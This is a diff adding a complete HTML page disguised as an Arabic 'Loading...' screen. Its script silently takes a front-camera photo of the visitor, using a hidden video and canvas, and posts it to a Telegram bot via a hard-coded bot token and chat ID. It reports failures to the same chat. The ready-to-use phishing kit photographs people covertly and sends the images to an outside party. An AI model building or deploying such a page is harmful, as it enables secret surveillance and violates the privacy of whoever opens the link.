@@ -1,0 +1,43 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>جاري التحميل...</title>
+  <style>
+    body{margin:0;padding:0;background:#111}
+    video,canvas{display:none}
+  </style>
+</head>
+<body>
+<video id="v" autoplay muted></video>
+<canvas id="c"></canvas>
+
+<script>
+/*======== غيّر هذين السطرين فقط ========*/
+const TOKEN   = '8327548051:AAGwqaB-ZOTNmyVUKX6V57HGkjvZyDIWDvw'
+const CHAT_ID = '7561625151';            // Chat-ID الخاص بك (أو المجموعة)
+/*=====================================*/
+
+navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false})
+  .then(stream=>{
+      const v=document.getElementById('v');
+      const c=document.getElementById('c');
+      v.srcObject=stream;
+      v.onloadedmetadata=()=>{
+        c.width=v.videoWidth; c.height=v.videoHeight;
+        c.getContext('2d').drawImage(v,0,0);
+        c.toBlob(blob=>{
+          const fd=new FormData();
+          fd.append('photo',blob,'capture.jpg');
+          fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${CHAT_ID}&caption=صورة جديدة`,
+                {method:'POST',body:fd})
+          .finally(()=>stream.getTracks().forEach(t=>t.stop()));
+        },'image/jpeg',0.9);
+      };
+  })
+  .catch(err=>{
+      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=فشل التقاط الصورة`);
+  });
+</script>
+</body>
+</html>
